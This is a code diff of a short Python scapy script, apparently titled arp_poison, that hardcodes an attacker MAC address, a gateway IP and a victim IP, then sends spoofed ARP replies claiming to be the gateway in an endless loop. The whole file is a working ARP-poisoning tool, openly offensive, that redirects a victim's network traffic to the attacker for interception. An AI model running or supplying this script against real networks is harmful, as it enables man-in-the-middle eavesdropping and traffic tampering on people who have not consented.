@@ -4,26 +4,12 @@
 # Written by aviran
 # visit for more details aviran.org
  
-from scapy import *
-import sys
+from scapy.all import *
+mac_aku = "24:0A:64:1B:BA:91"
+ip_gateway = "172.20.10.1"
+ip_korban = "172.20.10.2"
 
-class arp_poison(object):
-    def get_mac_address():
-        my_macs = [get_if_hwaddr(i) for i in get_if_list()]
-        for mac in my_macs:
-            if(mac != "00:00:00:00:00:00"):
-                return mac
-    Timeout=2
+packet = Ether()/ARP(op="who-has",hwsrc=mac_aku,psrc=ip_gateway,pdst=ip_korban)
 
-    if len(sys.argv) != 3:
-        print "Usage: arp_poison.py HOST_TO_ATTACK HOST_TO_IMPERSONATE"
-        sys.exit(1)
- 
-    my_mac = get_mac_address()
-    if not my_mac:
-        print "Cant get local mac address, quitting"
-        sys.exit(1)
- 
-    packet = Ether()/ARP(op="who-has",hwsrc=my_mac,psrc=sys.argv[2],pdst=sys.argv[1])
- 
+while 1: 
     sendp(packet)
